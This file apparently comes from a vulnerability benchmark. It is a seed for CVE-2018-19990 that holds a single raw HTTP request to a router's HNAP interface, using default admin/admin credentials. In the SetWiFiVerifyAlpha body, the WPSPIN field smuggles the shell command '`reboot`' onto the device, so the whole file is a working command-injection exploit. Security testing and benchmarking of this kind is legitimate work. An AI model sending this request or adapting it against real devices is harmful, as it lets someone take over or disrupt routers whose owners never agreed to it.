Vulnerabilities/CVE-2018-19990/BM-2024-00083-payload.seed

POST /HNAP1/ HTTP/1.1
Host: 192.168.33.166:33498
Content-Length: 468
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"
X-Requested-With: XMLHttpRequest
HNAP_AUTH: 0BDE234965C706E943316BBB83DF59A6 1731119660
Accept: */*
Content-Type: text/xml; charset=UTF-8
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.33.166:33498
Referer: http://192.168.33.166:33498/Home.html
Accept-Encoding: gzip, deflate, br
Cookie: Authorization=Basic YWRtaW46YWRtaW4=; UID=admin; PSW=admin; uid=ujcI4DPmyw; PrivateKey=C8B843B87E7C03EF5F224D6D4949A7F1; timeout=0
Connection: keep-alive

<?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body><SetWiFiVerifyAlpha xmlns="http://purenetworks.com/HNAP1/" > <WPS><DEV_PIN>default</DEV_PIN><ResetToUnconfigured>default</ResetToUnconfigured><WPSPBC>default</WPSPBC><WPSPIN>'`reboot`'</WPSPIN></WPS></SetWiFiVerifyAlpha></soap:Body></soap:Envelope>